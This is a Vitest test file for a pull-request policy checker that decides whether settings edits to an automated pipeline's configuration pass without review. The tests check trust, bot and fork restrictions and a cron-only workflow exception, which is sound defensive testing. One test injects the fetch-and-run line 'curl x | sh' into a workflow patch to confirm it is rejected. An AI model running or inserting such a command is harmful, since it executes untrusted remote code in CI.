import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { parse as parseYaml } from "yaml";
import { runPolicy, settingsApproval, type PolicyContext } from "../src/commands/policy.js";
import { FACTORY_YAML, GARDEN_WORKFLOW, SETTINGS_LABEL, diffSettings, applySettings, onlyCronLineChanged } from "../src/lib/settings.js";
import type { Policy, PullRequestFacts } from "../src/lib/types.js";

// The policy the installer really writes, so protected paths include the policy file and sandbox.
const policy = parseYaml(readFileSync(new URL("../../templates/definition/policy.yaml", import.meta.url), "utf8")) as Policy;
const template = readFileSync(new URL("../../templates/definition/factory.yaml", import.meta.url), "utf8");
const CRON_PATCH = '@@ -10,7 +10,7 @@\n   schedule:\n-    - cron: "0 6 * * *"\n+    - cron: "0 3 * * *"\n   workflow_dispatch:';

function facts(over: Partial<PullRequestFacts> = {}, head = applySettings(template, { monthly_budget: 60 }).yaml): PullRequestFacts {
  const diff = diffSettings(template, head);
  return {
    number: 7, head_sha: "abc", base_ref: "main", author: "philip", author_association: "OWNER",
    from_fork: false, labels: [SETTINGS_LABEL], changed_files: [FACTORY_YAML], added_files: [], reviews: [], draft: false,
    settings_edit: { ...diff, author_association: "OWNER", author_is_bot: false, author_has_write: true, workflow_ok: true },
    ...over,
  };
}
const ctx = (pr: PullRequestFacts): PolicyContext => ({ policy, pr, appLogins: ["factory-app[bot]"] });

describe("a settings change made by a trusted person", () => {
  it("passes on its author's say-so when only listed settings moved", () => {
    const r = runPolicy(ctx(facts()));
    expect(r.conclusion).toBe("success");
    expect(r.notes.join(" ")).toMatch(/Settings change by philip/);
  });

  it("includes the schedule: factory.yaml and the cleanup workflow's cron line together", () => {
    const head = applySettings(template, { gardening_hour: 3 }).yaml;
    const pr = facts({ changed_files: [FACTORY_YAML, GARDEN_WORKFLOW] }, head);
    expect(onlyCronLineChanged(CRON_PATCH)).toBe(true);
    expect(runPolicy(ctx(pr)).conclusion).toBe("success");
  });

  it("is refused without the label, even though everything else is right", () => {
    expect(runPolicy(ctx(facts({ labels: [] }))).conclusion).toBe("failure");
  });

  it("is refused when the workflow changes by more than its cron line", () => {
    const pr = facts({ changed_files: [FACTORY_YAML, GARDEN_WORKFLOW] });
    const bad = { ...pr, settings_edit: { ...pr.settings_edit!, workflow_ok: false } };
    expect(runPolicy(ctx(bad)).conclusion).toBe("failure");
  });

  it("is refused when it also touches the policy, the sandbox or any other workflow", () => {
    for (const extra of [".factory/definition/policy.yaml", ".factory/sandbox/manifest.json", ".github/workflows/factory-run.yml", "src/app.ts"]) {
      const r = runPolicy(ctx(facts({ changed_files: [FACTORY_YAML, extra] })));
      expect(r.conclusion, extra).toBe("failure");
    }
  });

  it("is refused for a key off the list: a model, a limit, the merge queue, the test check", () => {
    for (const [from, to] of [
      ["builder: claude-sonnet-5-5", "builder: other"],
      ["max_runs: 5", "max_runs: 99"],
      ["merge_queue: auto", "merge_queue: off"],
      ["test_check: null", "test_check: always-green"],
    ] as const) {
      const r = runPolicy(ctx(facts({}, template.replace(from, to))));
      expect(r.conclusion, from).toBe("failure");
      if (r.conclusion === "failure") expect(r.failures[0]!.kind).toBe("definition_without_approval");
    }
  });

  it("is refused for an allowed key set out of range, or shares that stop adding to 100", () => {
    expect(runPolicy(ctx(facts({}, template.replace("monthly_usd: 35", "monthly_usd: 0")))).conclusion).toBe("failure");
    expect(runPolicy(ctx(facts({}, template.replace("gardening: 25", "gardening: 40")))).conclusion).toBe("failure");
  });

  it("is refused when the author is not trusted, is a bot, or the PR is a fork's or a pipeline's", () => {
    const base = facts();
    const e = base.settings_edit!;
    expect(runPolicy(ctx({ ...base, settings_edit: { ...e, author_association: "NONE" } })).conclusion).toBe("failure");
    expect(runPolicy(ctx({ ...base, settings_edit: { ...e, author_is_bot: true } })).conclusion).toBe("failure");
    expect(runPolicy(ctx({ ...base, settings_edit: { ...e, author_has_write: false } })).conclusion).toBe("failure");
    expect(runPolicy(ctx({ ...base, author: "factory-app[bot]" })).conclusion).toBe("failure");
    expect(runPolicy(ctx({ ...base, author: "linear[bot]" })).conclusion).toBe("failure");
    expect(runPolicy(ctx({ ...base, from_fork: true })).conclusion).toBe("failure");
    expect(runPolicy(ctx({ ...base, pipeline: "hardening" })).conclusion).toBe("failure");
  });

  it("is refused when no setting changed", () => {
    expect(settingsApproval(ctx(facts({}, template))).ok).toBe(false);
  });

  it("does not make an ordinary human PR to the definition pass without a review", () => {
    const { settings_edit: _drop, ...pr } = facts({ labels: [] });
    const r = runPolicy(ctx(pr));
    expect(r.conclusion).toBe("failure");
  });

  it("still lets a real approval through for a change that is off the list", () => {
    const pr = facts({ reviews: [{ author: "teammate", author_association: "MEMBER", state: "APPROVED", submitted_at: "t", commit_sha: "abc" }] }, template.replace("max_runs: 5", "max_runs: 9"));
    expect(runPolicy(ctx(pr)).conclusion).toBe("success");
  });
});

import { gatherPullFacts } from "../src/commands/policy-run.js";
import type { GitHub, PullFile, PullResponse } from "../src/lib/github.js";

/** A GitHub stand-in holding two versions of the settings file. */
function stub(opts: { head: string; files: PullFile[]; user?: { login: string; type: string }; labels?: string[]; permission?: string }): GitHub {
  const pull: PullResponse = {
    number: 9, draft: false,
    head: { sha: "headsha", repo: { full_name: "o/r" } },
    base: { ref: "main", sha: "basesha", repo: { full_name: "o/r" } },
    user: opts.user ?? { login: "philip", type: "User" },
    author_association: "OWNER",
    labels: (opts.labels ?? [SETTINGS_LABEL]).map((name) => ({ name })),
  };
  return {
    pull: async () => pull,
    pullFiles: async () => opts.files,
    pullReviews: async () => [],
    fileAtRef: async (_p: string, ref: string) => (ref === "headsha" ? opts.head : template),
    get: async () => ({ permission: opts.permission ?? "admin" }),
    // the ledger lookup for a factory PR finds nothing
    defaultBranch: async () => "main",
  } as unknown as GitHub;
}
const f = (filename: string, patch?: string): PullFile => ({ filename, status: "modified", ...(patch === undefined ? {} : { patch }) });

describe("settings PRs, from GitHub's facts to the verdict", () => {
  it("a dashboard settings PR passes end to end", async () => {
    const head = applySettings(template, { monthly_budget: 80, gardening_hour: 2 }).yaml;
    const gh = stub({ head, files: [f(FACTORY_YAML), f(GARDEN_WORKFLOW, CRON_PATCH.replace("0 3", "0 2"))] });
    const pr = await gatherPullFacts(gh, 9);
    expect(pr.settings_edit).toMatchObject({ outside: [], invalid: [], workflow_ok: true, author_is_bot: false });
    expect(runPolicy(ctx(pr)).conclusion).toBe("success");
  });

  it("the same PR from an App fails, and a cron line plus anything else in the workflow fails", async () => {
    const head = applySettings(template, { monthly_budget: 80 }).yaml;
    const app = await gatherPullFacts(stub({ head, files: [f(FACTORY_YAML)], user: { login: "factory-app[bot]", type: "Bot" } }), 9);
    expect(runPolicy(ctx(app)).conclusion).toBe("failure");
    const sneaky = await gatherPullFacts(stub({ head, files: [f(FACTORY_YAML), f(GARDEN_WORKFLOW, CRON_PATCH + '\n+      - run: curl x | sh')] }), 9);
    expect(runPolicy(ctx(sneaky)).conclusion).toBe("failure");
  });

  it("a person with only read access does not count, whatever the PR's association says", async () => {
    const head = applySettings(template, { monthly_budget: 80 }).yaml;
    const pr = await gatherPullFacts(stub({ head, files: [f(FACTORY_YAML)], permission: "read" }), 9);
    expect(runPolicy(ctx(pr)).conclusion).toBe("failure");
  });

  it("an unlabelled PR is not looked at as a settings change at all", async () => {
    const head = applySettings(template, { monthly_budget: 80 }).yaml;
    const pr = await gatherPullFacts(stub({ head, files: [f(FACTORY_YAML)], labels: [] }), 9);
    expect(pr.settings_edit).toBeUndefined();
  });
});
